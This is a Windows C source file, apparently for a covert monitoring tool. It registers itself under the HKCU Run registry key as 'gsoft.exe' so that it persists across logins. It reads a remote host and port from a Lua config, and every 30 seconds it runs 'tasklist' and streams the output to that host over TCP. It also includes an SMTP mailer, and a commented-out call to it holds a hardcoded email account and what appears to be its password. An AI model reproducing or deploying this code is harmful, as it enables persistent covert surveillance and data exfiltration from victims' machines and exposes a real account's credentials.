#include <time.h>
#include <winSock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "spawn.h"
#include "lua.h"
#include "lualib.h"
#include "lauxlib.h"
#include "trace.h"

lua_State* L = NULL;
static void load_main_lua()
{
	L = lua_open();
	luaL_openlibs(L);
	if(luaL_dofile(L,"main.lua") != 0){
		lua_pop(L,1);
		lua_close(L);
		TRACE_OUT("load main.lua error!\n");
		L = NULL;
	}
	else{
		TRACE_OUT("load main.lua ok\n");
	}
}

int send_tasklist();
struct Base64Date6
{
  unsigned int d4:6;
  unsigned int d3:6;
  unsigned int d2:6;
  unsigned int d1:6;
};
// 协议中加密部分使用的是base64方法
char ConvertToBase64  (char   c6);
void EncodeBase64     (char   *dbuf, char *buf128, int len);
void SendMail         (char   *email,char *body,char* smtp,char* user,char* password);
int  OpenSocket       (struct sockaddr *addr);

int query_value()
{
   char Name[52];
   int Index=0;
   DWORD dwSize=52;
   DWORD Size,Type;
   HKEY hroot;                                                                               //子键句柄
   DWORD dwDisposition=0;
   RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,
    NULL,0,KEY_ALL_ACCESS,NULL,&hroot,&dwDisposition);                                       //获取根键句柄
   while(RegEnumValue(hroot,Index,Name,&dwSize,NULL,NULL,NULL,NULL)==ERROR_SUCCESS)
   {
    printf("%s\n",Name);
    Index++;                                                                                 //索引从0开始每次自增一，函数如果执行失败，则索引已到头
   }
   RegCloseKey(hroot);
   return 0;
}
int register_me()
{
  
  HKEY hroot;           //子键句柄
  DWORD dwDisposition=0;
  LONG result = RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,
    NULL,0,KEY_ALL_ACCESS,NULL,&hroot,&dwDisposition);

  char name[] = "\\gsoft.exe";
	char dir[1024] = {0};
	GetCurrentDirectory(1024,dir);
	strcat(dir,name);	
  //if(result == ERROR_SUCCESS)
//	  printf("create ok\n");
  result = RegSetValueEx(hroot,"gsoft",0,REG_SZ,(BYTE *)dir,strlen(dir)+1);
 // if(result == ERROR_SUCCESS)
//	  printf("set value ok\n");
  RegCloseKey(hroot);
  return 0;
}
/*
while (TRUE)
{
if(PeekMessage (&msg, NULL, 0, 0, PM_REMOVE))
{
if(msg.message == WM_QUIT)
break;
TranslateMessage(&msg);
DispatchMessage(&msg);
}
else
[ other program lines to do some work ]
}
return msg.wParam;
*/
SOCKET tcp_connect()
{
	const char* ip;
	int port;
	if(L == NULL){
		TRACE_OUT("L == NULL\n");
		return INVALID_SOCKET;
	}
	lua_getglobal(L,"ip");
	lua_getglobal(L,"port");
	ip = lua_tostring(L,-2);
	port = lua_tointeger(L,-1);
	TRACE_OUT("ip = %s;port = %d\n",ip,port);
  char* strip = (char*)malloc(strlen(ip) +1);
	strcpy(strip,ip);	
	struct hostent *Server = NULL;
	Server = gethostbyname(strip);
	TRACE_OUT("gethostbyname\n");
	free(strip);
	if(Server == NULL){
		lua_pop(L,2);
		return INVALID_SOCKET;
	}
  SOCKET s = socket(PF_INET, SOCK_STREAM, 0);
	TRACE_OUT("socket\n");
	if(s == INVALID_SOCKET){
		TRACE_OUT("socket error!\n");
		lua_pop(L,2);
		return s;
	}
	SOCKADDR_IN addr;
	ZeroMemory((char*)&addr,sizeof(addr));
	addr.sin_family = AF_INET;
	CopyMemory((char *)&addr.sin_addr.s_addr, 
			(char *)Server->h_addr_list[0],
			Server->h_length);
	addr.sin_port = htons(port);
	TRACE_OUT("htons\n");
	if(SOCKET_ERROR == connect(s,(struct sockaddr *)&addr,sizeof(addr))){
		lua_pop(L,2);
		return INVALID_SOCKET;
	}
	lua_pop(L,2);
	return s;
}

SOCKET udp_send()
{
 SOCKET sock;   //socket套接字
 
 //1.启动SOCKET库，版本为2.0
 WORD wVersionRequested;
 WSADATA wsaData;
 int err; 
 wVersionRequested = MAKEWORD( 2, 0); 
 err = WSAStartup( wVersionRequested, &wsaData );
 if ( 0 != err )  //检查Socket初始化是否成功
 {
 
  return INVALID_SOCKET;
 }
 //检查Socket库的版本是否为2.0
 if (LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
 {
  WSACleanup( );
  return INVALID_SOCKET;
 }
 
 //2.创建socket，
 sock = socket(
  AF_INET,           //internetwork: UDP, TCP, etc
  SOCK_DGRAM,        //SOCK_DGRAM说明是UDP类型
  0                  //protocol
  );
 
 if (INVALID_SOCKET == sock ) {
  return INVALID_SOCKET;
 }
 
 //3.设置该套接字为广播类型，
 int opt = 1;
 setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char FAR *)(&opt), sizeof(opt));
 return sock;
}

int close_sock(SOCKET* sock)
{
	closesocket(*sock);
	WSACleanup();
	return 0;
}
int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, // 
	   LPSTR lpCmdLine, int nCmdShow) // 
{
	register_me();
	TraceInit();
	load_main_lua();
	if(L != NULL){
		lua_getglobal(L,"trace");
		BOOL bTrace = lua_toboolean(L,-1);
		lua_pop(L,1);
		if(!bTrace)
			TraceClose();
	}
	WSADATA wsaData;
	int err; 
	int wVersionRequested = MAKEWORD( 2, 0); 
	err = WSAStartup( wVersionRequested, &wsaData );
	SOCKET sock = tcp_connect();
	if(sock == INVALID_SOCKET){
		TRACE_OUT("connect error!\n");
	}
 else{
		TRACE_OUT("connect ok!\n");
 }
	UINT_PTR time_handle = SetTimer(NULL,0,1000 * 30 ,NULL);
	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&msg, (HWND) NULL, 0, 0)) > 0 ) { 
		if(bRet == -1)
			return -1;
		if(msg.message == WM_QUIT)
			break;
		else if(msg.message == WM_TIMER)
			send_tasklist(&sock);
		TranslateMessage(&msg); 		
		DispatchMessage(&msg);
	}
	KillTimer(NULL,time_handle);
	close_sock(&sock);
	lua_close(L);
	WSACleanup();
	TraceClose();
	return msg.wParam;
}
int send_msg(SOCKET sock,char* szMsg)
{
/*
 struct sockaddr_in addrto;            //发往的地址 
 memset(&addrto,0,sizeof(addrto));
 addrto.sin_family = AF_INET;               //地址类型为internetwork
 addrto.sin_addr.s_addr = INADDR_BROADCAST; //设置ip为广播地址
 addrto.sin_port = htons(7861);             //端口号为7861
 
 int nlen=sizeof(addrto);
 unsigned int uIndex = 1;

 int result = sendto(sock, szMsg, strlen(szMsg), 0, (struct sockaddr*)(&addrto),nlen);
 if(result == SOCKET_ERROR){
	return 0;
 }
*/
 int result = send(sock,szMsg,strlen(szMsg),0);
 return result;
}
int send_tasklist(SOCKET* sock)
{
	SPAWN_PIPE pipes = create_spawnpipe();
	spawn_child("tasklist",pipes);
	char buf[1024] = "";

	//int len = strlen(EmailContents) + strlen(subject);
	while(pipe_getline(pipes,buf,1024) != NULL)
	{
		if(*sock == INVALID_SOCKET){
			*sock = tcp_connect();
		} 	
		if(*sock != INVALID_SOCKET){
			TRACE_OUT(buf);
			if(SOCKET_ERROR == send_msg(*sock,buf)){
				closesocket(*sock);
				*sock = INVALID_SOCKET;
			}
		}
	}
	//SendMail(EmailTo, data,"smtp.qq.com","gexiangying@foxmail.com","asd38LNM");
	//free(data);
	pipe_closein(pipes);
	pipe_closeout(pipes);
	if(*sock != INVALID_SOCKET){
		if(SOCKET_ERROR == send_msg(*sock,"END.exe\n")){
			closesocket(*sock);
			*sock = INVALID_SOCKET;
		}
	}
	return 0;
}

char ConvertToBase64(char uc)
{
  if(uc < 26)
  {
    return 'A' + uc;
  }
  if(uc < 52)
  {
    return 'a' + (uc - 26);
  }
  if(uc < 62)
  {
    return '0' + (uc - 52);
  }
  if(uc == 62)
  {
    return '+';
  }
  return '/';
}

// base64的实现
void EncodeBase64(char *dbuf, char *buf128, int len)
{
  struct Base64Date6 *ddd      = NULL;
  int           i        = 0;
  char          buf[256] = {0};
  char          *tmp     = NULL;
  char          cc       = '\0';

  memset(buf, 0, 256);
  strncpy(buf, buf128,256);
  for(i = 1; i <= len/3; i++)
  {
    tmp             = buf + (i-1)*3;
    cc              = tmp[2];
    tmp[2]          = tmp[0];
    tmp[0]          = cc;
    ddd             = (struct Base64Date6 *)tmp;
    dbuf[(i-1)*4+0] = ConvertToBase64((unsigned int)ddd->d1);
    dbuf[(i-1)*4+1] = ConvertToBase64((unsigned int)ddd->d2);
    dbuf[(i-1)*4+2] = ConvertToBase64((unsigned int)ddd->d3);
    dbuf[(i-1)*4+3] = ConvertToBase64((unsigned int)ddd->d4);
  }
  if(len % 3 == 1)
  {
    tmp             = buf + (i-1)*3;
    cc              = tmp[2];
    tmp[2]          = tmp[0];
    tmp[0]          = cc;
    ddd             = (struct Base64Date6 *)tmp;
    dbuf[(i-1)*4+0] = ConvertToBase64((unsigned int)ddd->d1);
    dbuf[(i-1)*4+1] = ConvertToBase64((unsigned int)ddd->d2);
    dbuf[(i-1)*4+2] = '=';
    dbuf[(i-1)*4+3] = '=';
  }
  if(len%3 == 2)
  {
    tmp             = buf+(i-1)*3;
    cc              = tmp[2];
    tmp[2]          = tmp[0];
    tmp[0]          = cc;
    ddd             = (struct Base64Date6 *)tmp;
    dbuf[(i-1)*4+0] = ConvertToBase64((unsigned int)ddd->d1);
    dbuf[(i-1)*4+1] = ConvertToBase64((unsigned int)ddd->d2);
    dbuf[(i-1)*4+2] = ConvertToBase64((unsigned int)ddd->d3);
    dbuf[(i-1)*4+3] = '=';
  }
  return;
}
// 发送邮件
void SendMail(char *email, char *body,char* smtp,char* user,char* password)
{
  int     sockfd     = {0};
  char    buf[1500]  = {0};
  char    rbuf[1500] = {0};
  char    login[128] = {0};
  char    pass[128]  = {0};
  
  char*  data = (char*)malloc(strlen(body) + 16);
   
  WSADATA WSAData;
  struct sockaddr_in their_addr = {0};
  WSAStartup(MAKEWORD(2, 2), &WSAData);
  memset(&their_addr, 0, sizeof(their_addr));
  
  their_addr.sin_family = AF_INET;
  their_addr.sin_port   = htons(25);
  struct hostent* hptr         = gethostbyname(smtp); 
  memcpy(&their_addr.sin_addr.S_un.S_addr, hptr->h_addr_list[0], hptr->h_length); 
  /*
  printf("IP of smpt.qq.com is : %d:%d:%d:%d\n", 
          their_addr.sin_addr.S_un.S_un_b.s_b1, 
          their_addr.sin_addr.S_un.S_un_b.s_b2, 
          their_addr.sin_addr.S_un.S_un_b.s_b3, 
          their_addr.sin_addr.S_un.S_un_b.s_b4); 
*/
  // 连接邮件服务器，如果连接后没有响应，则2 秒后重新连接
  sockfd = OpenSocket((struct sockaddr *)&their_addr);
  memset(rbuf, 0, 1500);
  while(recv(sockfd, rbuf, 1500, 0) == 0)
  {
   // cout<<"reconnect..."<<endl;
    Sleep(2);
    sockfd = OpenSocket((struct sockaddr *)&their_addr);
    memset(rbuf, 0, 1500);
  }

  //cout<<rbuf<<endl;

  // EHLO
  memset(buf, 0, 1500);
  _snprintf(buf, 1500, "EHLO HYL-PC\r\n");
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"EHLO REceive: "<<rbuf<<endl;

  // AUTH LOGIN
  memset(buf, 0, 1500);
  _snprintf(buf, 1500, "AUTH LOGIN\r\n");
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"Auth Login Receive: "<<rbuf<<endl;

  // USER
  memset(buf, 0, 1500);
  _snprintf(buf, 1500, user);//你的邮箱账号
  memset(login, 0, 128);
  EncodeBase64(login, buf, strlen(buf));
  _snprintf(buf, 1500, "%s\r\n", login);
  send(sockfd, buf, strlen(buf), 0);
 // cout<<"Base64 UserName: "<<buf<<endl;
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
 // cout<<"User Login Receive: "<<rbuf<<endl;

  // PASSWORD
  _snprintf(buf, 1500, password);//你的邮箱密码
  memset(pass, 0, 128);
  EncodeBase64(pass, buf, strlen(buf));
  _snprintf(buf, 1500, "%s\r\n", pass);
  send(sockfd, buf, strlen(buf), 0);
  //cout<<"Base64 Password: "<<buf<<endl;

  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
 // cout<<"Send Password Receive: "<<rbuf<<endl;

  // MAIL FROM
  memset(buf, 0, 1500);
  _snprintf(buf, 1500, "MAIL FROM: <%s>\r\n",user);
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"set Mail From Receive: "<<rbuf<<endl;

  // RCPT TO 第一个收件人
  _snprintf(buf, 1500, "RCPT TO:<%s>\r\n", email);
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
 // cout<<"Tell Sendto Receive: "<<rbuf<<endl;

  // DATA 准备开始发送邮件内容
  _snprintf(buf, 1500, "DATA\r\n");
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"Send Mail Prepare Receive: "<<rbuf<<endl;

  // 发送邮件内容，\r\n.\r\n内容结束标记
  sprintf(data, "%s\r\n.\r\n", body);
  send(sockfd, data, strlen(data), 0);
  free(data);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"Send Mail Receive: "<<rbuf<<endl;

  // QUIT
  _snprintf(buf, 1500, "QUIT\r\n");
  send(sockfd, buf, strlen(buf), 0);
  memset(rbuf, 0, 1500);
  recv(sockfd, rbuf, 1500, 0);
  //cout<<"Quit Receive: "<<rbuf<<endl;

  //清理工作
  closesocket(sockfd);
  WSACleanup();
  return;
}
// 打开TCP Socket连接
int OpenSocket(struct sockaddr *addr)
{
  int sockfd = 0;
  sockfd=socket(PF_INET, SOCK_STREAM, 0);
  if(sockfd < 0)
  {
   // cout<<"Open sockfd(TCP) error!"<<endl;
    exit(-1);
  }
  if(connect(sockfd, addr, sizeof(struct sockaddr)) < 0)
  {
   // cout<<"Connect sockfd(TCP) error!"<<endl;
    exit(-1);
  }
  return sockfd;
}
